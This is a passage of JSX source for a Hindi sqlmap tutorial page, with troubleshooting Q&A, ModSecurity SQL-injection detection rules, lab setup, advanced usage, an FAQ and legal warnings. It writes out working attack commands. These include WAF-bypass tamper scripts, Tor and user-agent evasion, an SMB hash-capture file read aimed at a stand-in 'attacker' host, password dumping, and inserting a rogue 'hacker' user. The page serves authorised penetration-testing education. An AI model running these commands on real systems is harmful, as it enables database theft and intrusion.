# Nikto में मिले URLs पर sqlmap चलाओ`}
      />

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'इंजेक्शन नहीं मिल रहा', a: 'लेवल और रिस्क बढ़ाओ (--level=5 --risk=3)। सभी टेक्निक्स ट्राई करो (--technique=BEUSTQ)। टैम्पर स्क्रिप्ट्स यूज़ करो।' },
          { q: 'WAF ब्लॉक कर रहा है', a: 'टैम्पर स्क्रिप्ट्स यूज़ करो: --tamper=space2comment,between,randomcase। प्रॉक्सी चेंज करो। डिले बढ़ाओ (--delay=2)।' },
          { q: 'बहुत धीमा चल रहा है', a: 'थ्रेड्स बढ़ाओ (--threads=10)। लेवल कम करो (--level=1)। स्पेसिफिक पैरामीटर टेस्ट करो (-p id)।' },
          { q: 'OS शेल नहीं मिल रहा', a: 'DBA प्रिविलेजेस चेक करो (--is-dba)। xp_cmdshell enable नहीं होगा। --privileges चेक करो।' },
          { q: 'गलत डेटाबेस डिटेक्ट हो रहा है', a: '--dbms="MySQL" स्पेसिफाई करो। फिंगरप्रिंट चेक करो (--fingerprint)।' },
          { q: 'False positives आ रहे हैं', a: '--string="Success" या --not-found="404" स्पेसिफाई करो। --technique=E (error-based) ट्राई करो।' },
          { q: 'बहुत ज़्यादा रिक्वेस्ट भेज रहा है', a: '--level=1 और --risk=1 से शुरू करो। स्पेसिफिक पैरामीटर टेस्ट करो (-p)।' },
          { q: 'HTTPS URL काम नहीं कर रहा', a: '--force-ssl फ्लैग यूज़ करो। सर्टिफिकेट एरर आ रहा है तो --skip-verify यूज़ करो।' },
          { q: 'डेटाबेस डंप बहुत स्लो है', a: '--threads=10 से थ्रेड्स बढ़ाओ। --start=1 --stop=100 से रो लिमिट सेट करो। स्पेसिफिक कॉलम्स चुनो (-C)।' },
          { q: 'POST request में injection find नहीं हो रहा', a: '--data="param=value" से POST data दो। --method=POST explicitly set करो। Burp से request save करके -r flag से import करो।' },
          { q: 'JSON API में injection test कैसे करें', a: '--data=\'{"id":1}\' --headers="Content-Type: application/json" यूज़ करो। json-based tamper scripts भी try करो।' },
          { q: 'Session cookies expire हो रहे हैं', a: '--cookie="session=abc" set करो। --cookie-file से cookies import करो। --crawl से auto-discovery करो।' },
          { q: 'sqlmap को specific injection point कैसे बताएं', a: 'URL में * लगाओ: http://target.com/page?id=1*। या -p param_name से specific parameter target करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        SQL इंजेक्शन से बचने के लिए मल्टी-लेयर डिफेंस स्ट्रैटेजी अपनानी चाहिए। सिर्फ एक टेक्निक काफी नहीं है — इनपुट वैलिडेशन, पैरामीटराइज़्ड क्वेरीज़, WAF, और लॉगिंग सब साथ में चाहिए।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">पैरामीटराइज़्ड क्वेरीज़:</strong> Prepared statements इस्तेमाल करें — SQL इंजेक्शन सबसे अच्छा defense</li>
        <li><strong className="text-white">इनपुट वैलिडेशन:</strong> Whitelist-based validation — सिर्फ expected values allow करें</li>
        <li><strong className="text-white">WAF:</strong> Web Application Firewall — ModSecurity, Cloudflare, AWS WAF</li>
        <li><strong className="text-white">स्टोर्ड प्रोसीजर:</strong> डेटाबेस में stored procedures इस्तेमाल करें</li>
        <li><strong className="text-white">एरर हैंडलिंग:</strong> डेटाबेस एरर्स यूज़र को न दिखाएं — generic error messages</li>
        <li><strong className="text-white">Least Privilege:</strong> वेब एप्लिकेशन को सिर्फ ज़रूरी permissions दें</li>
        <li><strong className="text-white">लॉगिंग:</strong> SQL क्वेरीज़ लॉग करें — suspicious patterns detect करें</li>
        <li><strong className="text-white">ORM यूज़ करें:</strong> Object-Relational Mapping — SQLAlchemy, Hibernate, Eloquent</li>
        <li><strong className="text-white">एस्केपिंग:</strong> डेटाबेस-स्पेसिफिक एस्केपिंग फंक्शंस यूज़ करें</li>
        <li><strong className="text-white">रेगुलर ऑडिट:</strong> कोड रिव्यू और पेनेट्रेशन टेस्टिंग रेगुलरली करें</li>
        <li><strong className="text-white">सिक्योरी कोडिंग ट्रेनिंग:</strong> डेवलपर्स को OWASP guidelines सिखाओ</li>
        <li><strong className="text-white">डेटाबेस हार्डनिंग:</strong> डिफ़ॉल्ट क्रेडेंशियल्स बदलो, अनावश्यक features डिसेबल करो</li>
      </ul>

      <CodeBlock
        title="SQL Injection Detection Rules"
        code={`# ModSecurity SQL injection rules:
# /etc/modsecurity/modsecurity.conf

# SQL injection patterns detect करो:
SecRule ARGS "@detectSQLi" \\
  "id:1001,phase:2,block,msg:'SQL Injection Detected'"

# SQL keywords block करो:
SecRule ARGS "@rx (union|select|insert|update|delete|drop|alter)" \\
  "id:1002,phase:2,block,msg:'SQL Keyword in Input'"

# Error-based injection detect:
SecRule RESPONSE_BODY "@rx (SQL syntax|mysql_fetch|ORA-|ODBC)" \\
  "id:1003,phase:4,block,msg:'SQL Error Leakage'"

# AWS WAF SQL injection rule:
# AWS Console → WAF → Rules → Add SQL injection rule
# Inspect: Body, URI, Query String
# Action: Block

# Cloudflare WAF:
# Security → WAF → Managed Rules → SQLi ruleset enable`}
      />
      <CodeBlock
        title="Automated Defense Testing"
        code={`#!/bin/bash
# अपने defense test करो — sqlmap से verify करो कि WAF काम कर रहा है

# Step 1: WAF enable करो (ModSecurity)
sudo systemctl restart apache2

# Step 2: sqlmap से test करो
sqlmap -u "http://your-site.com/page?id=1" \\
  --batch --level=3 --risk=2

# Expected result: WAF ब्लॉक करे (403 Forbidden)
# अगर injection मिल जाए → WAF properly configured नहीं है

# Step 3: टैम्पर स्क्रिप्ट्स से bypass test:
sqlmap -u "http://your-site.com/page?id=1" \\
  --tamper=space2comment,between,randomcase --batch

# अगर bypass हो जाए → WAF rules strengthen करो

# Step 4: Report generate करो:
# अपने defense को regularly test करो
# Quarterly penetration testing schedule रखो`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        sqlmap के results को properly analyze और report करना ज़रूरी है। Professional penetration testing में client को detailed report देनी होती है जिसमें vulnerabilities, impact, और remediation steps हों।
      </p>
      <CodeBlock
        title="Output Organization"
        code={`# आउटपुट डायरेक्टरी सेट करो:
sqlmap -u "URL" --output-dir=/tmp/engagement_2024

# डायरेक्टरी स्ट्रक्चर:
# /tmp/engagement_2024/
# ├── target.com/
# │   ├── log (attack log)
# │   ├── session.sqlite (session data)
# │   ├── dump/ (extracted data)
# │   └── files/ (file reads)
# └── summary.csv

# CSV में results export:
sqlmap -u "URL" --dump --dump-format=CSV \\
  --output-dir=/tmp/report

# HTML report generate:
# sqlmap का output लो → Markdown में convert करो

# Session management:
sqlmap --flush-session  # पुराने results clear
sqlmap --purge-output   # सभी output delete (सावधानी से)`}
      />

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="Practice Lab"
        code={`# DVWA (Damn Vulnerable Web Application):
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# SQLi-labs:
git clone https://github.com/Audi-1/sqli-labs.git
cd sqli-labs
# XAMPP/WAMP में setup करें

# WebGoat:
docker run -p 8080:8080 webgoat/webgoat

# Juice Shop (OWASP):
docker run -p 3000:3000 bkimminich/juice-shop

# प्रैक्टिस:
sqlmap -u "http://localhost/vuln?id=1" --batch

# SQLi-labs डिटेल्ड सेटअप:
# 1. XAMPP इंस्टॉल करो (Apache + MySQL + PHP)
# 2. SQLi-labs डाउनलोड करो
# 3. /opt/lampp/htdocs/ में कॉपी करो
# 4. http://localhost/sqli-labs/ खोलो
# 5. हर लैब को एक-एक करके टेस्ट करो

# PortSwigger Web Security Academy:
# https://portswigger.net/web-security/sql-injection
# फ्री ऑनलाइन लैब्स — ब्राउज़र में प्रैक्टिस

# VulnHub VMs:
# download vulnhub.com से SQL injection focused VMs
# VirtualBox में import करो और टेस्ट करो`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Sqlmap Usage"
        code={`# कस्टम टैम्पर स्क्रिप्ट बनाएं:
# /usr/share/sqlmap/tamper/custom.py बनाएं:
# def tamper(payload):
#     return payload.replace("'", "%%27")

# सेकंड-ऑर्डर इंजेक्शन:
sqlmap -u "URL" --second-order="http://target.com/profile"

# कस्टम पेलोड:
sqlmap -u "URL" --prefix="'" --suffix="-- -"

# कस्टम व्हेयर क्लॉज:
sqlmap -u "URL" --where="id>10"  # Greater than 10

# डेटाबेस स्पेसिफिक:
sqlmap -u "URL" --dbms="MySQL"

# फ्लश सेशंस (पुराने रिजल्ट्स हटाओ):
sqlmap --flush-session

# कस्टम इंजेक्शन पॉइंट:
sqlmap -u "http://target.com/page?id=1*&name=test" --batch`}
      />
      <CodeBlock
        title="Dumper and SMB Relay"
        code={`# डेटाबेस डंपर (बड़े डेटा के लिए):
sqlmap -u "URL" --dump -D mydb -T users --dump-format=CSV

# SMB Relay अटैक (Windows):
# SMB शेयर से हैशेस कैप्चर करो:
sqlmap -u "URL" --file-read="\\\\\\\\attacker\\\\share\\\\test.txt"

# SQL शेल से डेटा:
sqlmap -u "URL" --sql-shell
# फिर SQL कमांड्स:
# SELECT * FROM users;
# SELECT password FROM users WHERE username='admin';

# स्टैक्ड क्वेरीज़ से INSERT/UPDATE:
sqlmap -u "URL" --technique=S
# फिर sql-shell में:
# INSERT INTO users VALUES('hacker','pass123');

# डेटाबेस स्कीमा एक्सपोर्ट:
sqlmap -u "URL" --schema --batch

# प्रिविलेजेस चेक:
sqlmap -u "URL" --privileges --batch
sqlmap -u "URL" --is-dba`}
      />
      <CodeBlock
        title="Evasion Techniques"
        code={`# रेट लिमिटिंग से बचो:
sqlmap -u "URL" --delay=5 --timeout=30

# रैंडम यूज़र-एजेंट:
sqlmap -u "URL" --randomize=ua

# कस्टम हेडर्स:
sqlmap -u "URL" --headers="X-Forwarded-For: 1.1.1.1\\nX-Custom: test"

# मल्टीपल प्रॉक्सी:
sqlmap -u "URL" --proxy="socks5://127.0.0.1:9050"

# टॉर से:
sqlmap -u "URL" --tor --tor-type=SOCKS5 --check-tor

# कस्टम रिक्वेस्ट:
sqlmap -u "URL" --method=PUT --data='{"id":1}'

# JSON API टेस्ट:
sqlmap -u "URL" --data='{"user":"admin"}' \\
  --headers="Content-Type: application/json" \\
  -p user`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या sqlmap फ्री है?', a: 'हाँ, पूरी तरह फ्री और ओपन सोर्स (GPLv2)। कमर्शियल यूज़ भी फ्री।' },
          { q: 'कौन से डेटाबेस सपोर्ट करता है?', a: 'MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, Access — 6 डेटाबेस।' },
          { q: 'WAF बायपास कैसे करें?', a: 'टैम्पर स्क्रिप्ट्स: --tamper=space2comment,between,randomcase। 100+ स्क्रिप्ट्स उपलब्ध।' },
          { q: 'OS शेल कैसे मिलेगा?', a: '--os-shell ट्राई करो। DBA प्रिविलेजेस चाहिए। MySQL में UDF, MSSQL में xp_cmdshell।' },
          { q: 'Burp Suite से कैसे इम्पोर्ट करें?', a: 'रिक्वेस्ट फाइल सेव करो फिर sqlmap -r request.txt से इम्पोर्ट करो।' },
          { q: 'क्या यह Android/Termux पर चलता है?', a: 'हाँ! pkg install python करो फिर pip install sqlmap।' },
          { q: 'False positives कैसे रोकें?', a: '--string="Success" या --not-found="404" स्पेसिफाई करो।' },
          { q: 'Second-order इंजेक्शन क्या है?', a: 'जब malicious input पहले DB में स्टोर होता है और बाद में दूसरी क्वेरी में एग्ज़ीक्यूट होता है। --second-order फ्लैग से टेस्ट करो।' },
          { q: 'क्या NoSQL इंजेक्शन भी कर सकता है?', a: 'नहीं, sqlmap सिर्फ SQL इंजेक्शन के लिए है। NoSQL के लिए NoSQLMap या Burp Intruder यूज़ करो।' },
          { q: 'sqlmap कितना stealthy है?', a: 'Default mode में बहुत सारे requests भेजता है — IDS detect कर सकता है। --delay, --randomize=ua, --tamper से stealth बढ़ाओ।' },
          { q: 'Authentication bypass कैसे करें?', a: 'पहले valid login करके cookies लो, फिर --cookie="session=abc" से sqlmap को दो। या --auth-type=BASIC --auth-cred="user:pass" यूज़ करो।' },
          { q: 'GraphQL API में SQL injection test कैसे करें?', a: '--data=\'{"query":"{ user(id: 1*) { name } }"}\' से GraphQL query में * लगाओ। --headers="Content-Type: application/json" ज़रूरी है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SQLninja</td><td className="py-2 px-3">MS SQL exploitation</td><td className="py-2 px-3">xp_cmdshell focused</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">jSQL Injection</td><td className="py-2 px-3">SQL injection GUI</td><td className="py-2 px-3">Java-based, visual interface</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SQLPowerInjector</td><td className="py-2 px-3">SQL injection</td><td className="py-2 px-3">Multi-database, GUI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Havij</td><td className="py-2 px-3">SQL injection</td><td className="py-2 px-3">GUI-based, Windows</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">NoSQLMap</td><td className="py-2 px-3">NoSQL injection</td><td className="py-2 px-3">MongoDB, CouchDB</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>हमेशा --batch flag यूज़ करो — ऑटोमैटिक रिस्पॉन्स</li>
          <li>Burp Suite से रिक्वेस्ट सेव करो → -r flag से इम्पोर्ट करो</li>
          <li>पहले --level=1 --risk=1 से शुरू करो, फिर बढ़ाओ</li>
          <li>टैम्पर स्क्रिप्ट्स कॉम्बिनेशन में यूज़ करो — एक अकेला काफी नहीं</li>
          <li>--threads=10+ से स्पीड बढ़ाओ (नेटवर्क पर डिपेंड करता है)</li>
          <li>--output-dir से रिजल्ट्स ऑर्गनाइज़्ड रखो</li>
          <li>--flush-session से पुराने डेटा क्लियर करो</li>
          <li>REST API से CI/CD पाइपलाइन में इंटीग्रेट करो</li>
          <li>--skip-static से स्टैटिक रिसोर्सेज़ स्किप करो</li>
          <li>डेटाबेस स्पेसिफाई करो (--dbms) — स्कैन तेज़ होता है</li>
        </ul>
      </div>

      <h2>Legal and Ethical Considerations</h2>
      <p>
        SQL injection testing एक बहुत sensitive activity है। बिना written authorization के किसी भी web application पर SQL injection test करना illegal है। India में IT Act 2000 Section 43 और 66 के तहत unauthorized database access serious criminal offense है — 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है।
      </p>
      <p>
        Professional penetration testing engagement में हमेशा scope of work document बनाओ जिसमें clearly define हो कि कौन से URLs, parameters, और databases test करने हैं। Out-of-scope targets पर कभी test मत करो। SQL injection से database dump करना, OS shell लेना, या data modify करना — यह सब scope पर depend करता है। Client permission बिना data extract मत करो।
      </p>
      <p>
        Bug bounty programs में SQL injection highest-paying vulnerabilities में से एक है। HackerOne, Bugcrowd पर $500 से $50,000+ तक bounty मिलता है। लेकिन program rules carefully पढ़ो — कुछ programs automated scanning allow नहीं करते। sqlmap aggressive mode rate limiting trigger कर सकता है — responsible disclosure follow करो।
      </p>
      <p>
        Captured data (database dumps, credentials) को securely handle करो। Engagement खत्म होने पर सारा data delete करो। Report में sensitive data mask करो (password hashes partial show करो, PII redact करो)। Client को remediation guidance दो — सिर्फ vulnerability report काफी नहीं, fix recommendations भी ज़रूरी हैं।
      </p>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> sqlmap एक बहुत शक्तिशाली टूल है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए करें। बिना अनुमति के SQL इंजेक्शन करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत डेटाबेस एक्सेस अपराध है। 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है।
      </div>
    </TutorialLayout>
  )
}
